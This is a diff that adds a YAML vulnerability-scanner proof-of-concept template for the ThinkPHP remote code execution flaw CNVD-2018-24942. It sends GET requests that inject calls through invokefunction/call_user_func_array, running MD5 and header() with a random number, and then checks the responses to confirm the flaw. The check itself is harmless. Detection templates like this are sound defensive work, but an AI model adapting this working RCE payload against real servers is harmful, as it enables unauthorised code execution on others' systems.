@@ -1,0 +1,27 @@
+name: yaml-poc-thinkphp-thinkphp-rce-CNVD-2018-24942
+binding: 0be1594b-f022-4db5-bbfc-b1f3217c9245
+detail:
+    author: system_user
+    vulnerability:
+        id: 5a075e93-dced-4a72-94b8-ce8a721d1bec
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    c1: string(randomInt(800000000, 1000000000))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=MD5&vars[1][]={{c1}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(c1)))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]=TPRCEHEADER:{{c1}}
+            follow_redirects: false
+        expression: response.status == 200 && response.headers["TPRCEHEADER"].contains(c1)
+expression: r0() || r1()
